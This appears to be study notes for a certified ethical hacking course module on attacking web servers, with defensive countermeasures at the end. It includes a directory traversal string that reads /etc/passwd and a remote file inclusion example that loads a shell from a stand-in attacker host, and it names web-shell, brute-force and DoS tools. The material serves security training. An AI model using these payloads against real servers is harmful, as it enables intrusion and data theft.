
CEH v13 – Module 13: Hacking Web Servers
📌 Overview

Module 13 focuses on identifying, exploiting, and mitigating vulnerabilities in web servers, which host web content and process client requests. Attackers often target misconfigurations, outdated software, insecure scripts, and weak authentication to gain access, execute commands, or compromise the entire environment.

🎯 Learning Objectives

Understand web server architecture and components

Discover common web server vulnerabilities

Perform footprinting and enumeration

Exploit misconfigurations, weak permissions, and outdated server versions

Conduct DoS attacks, brute-force attacks, file inclusion exploits

Learn how to detect, prevent, and harden web servers

🏗️ Web Server Architecture

A standard web server includes:

Web Server Software: Apache, Nginx, IIS

Backend Engine: PHP, ASP.NET, Node.js

Database: MySQL, MongoDB, MSSQL

SSL/TLS, server modules, and CGI scripts

Weaknesses in any of these layers can lead to server compromise.

🚀 Common Attack Techniques
1. Web Server Footprinting

Identify:

Server version

Installed modules

Operating system

Directory structure
Tools: Nmap, Netcat, WhatWeb, Wappalyzer

2. Web Server Misconfigurations

Default credentials

Directory listing enabled

Insecure HTTP methods (PUT, TRACE)

Exposed config files (phpinfo, .git, backup files)

Weak SSL ciphers

3. Directory Traversal

Access restricted server files:

../../../../etc/passwd

4. File Inclusion Attacks (LFI / RFI)

LFI: Local File Inclusion

RFI: Remote File Inclusion

Example:

?page=http://attacker.com/shell.txt

5. File Upload Vulnerabilities

Uploading:

Web shells

Malicious scripts (.php, .jsp, .aspx)

Reverse shell payloads

Tools: Weevely, PentestMonkey

6. Authentication Attacks

Brute-force admin login

Credential stuffing

Cookie manipulation

Weak session management
Tools: Hydra, Burp Suite Intruder

7. Web Server DoS Attacks

Slowloris

HTTP floods

Resource exhaustion

8. Vulnerability Exploits

Exploiting:

Outdated Apache versions

IIS authentication bypass

PHP CGI vulnerabilities

Nginx misconfigurations
Tools: Metasploit, Nikto

🧰 Common Tools
Category	Tools
Recon	Nmap, WhatWeb, Netcat
Vulnerability Scanning	Nikto, Nessus, OpenVAS
Exploitation	Burp Suite, SQLMap, Metasploit
File Discovery	Dirb, Gobuster, FFUF
Shells	Weevely, PentestMonkey
DoS	Slowloris, Hping3
🛡️ Countermeasures
1. Server Hardening

Disable directory listing

Remove default/test files

Disable unnecessary modules

Enforce strong admin passwords

2. Secure Configuration

Use modern SSL/TLS versions

Restrict dangerous HTTP verbs

Limit upload types & file size

Implement proper permissions

3. Patch Management

Keep server software and frameworks updated

Regular vulnerability scanning

4. Monitoring & Logging

Enable access/error logs

Use IDS/IPS & SIEM solutions

File integrity monitoring

5. Web Application Firewall (WAF)

Examples:

ModSecurity

AWS WAF

Cloudflare WAF
